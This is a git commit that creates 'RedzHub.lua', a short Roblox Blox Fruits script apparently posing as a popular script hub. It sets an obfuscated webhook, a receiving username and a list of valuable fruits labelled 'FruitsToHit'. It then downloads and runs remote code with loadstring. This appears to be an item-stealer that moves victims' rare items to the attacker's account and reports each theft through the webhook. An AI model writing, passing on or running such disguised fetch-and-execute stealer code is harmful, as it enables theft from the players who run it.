187dcf11b367875e3ea497f59a7bf99d82ee8abb
NaruTeam2000 <lebakien048@gmail.com>
2025-03-02 23:52:53 +0700

    Create RedzHub.lua

---
+++ RedzHub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=elRLTlRWWWZ6MkpmbUg3bXkyQU1ldzo4UkpKaWl4Rmd2WFRNRjRJX0hBRExMOUptQ1dhbGw4XzJGYzJGTHpUaWwxQmtiVXFVNUJoQ19JblJQT1FIZnNkSUV5NFZsZXVNLXZ0d1ZIRWlXZWttWGFmUkdvUVNpNnZNQ0xTa3BIUHFvcUhwSE92TWZJQWx2bHY2T0F6MVN2ZWVRckxlcmt3TmhXM0tiUHNQTy1tYXFzUVV0X3RmbFQxSDZOQVpNdUI3MEk"
+Usernames = {"HTNTPBloxfruit"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Spirit-Spirit", "Gas-Gas", "Control-Control", "Venom-Venom", "Shadow-Shadow", "Dough-Dough", "T-Rex-T-Rex", "Mammoth-Mammoth", "Rumble-Rumble", "Portal-Portal", "Buddha-Buddha"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
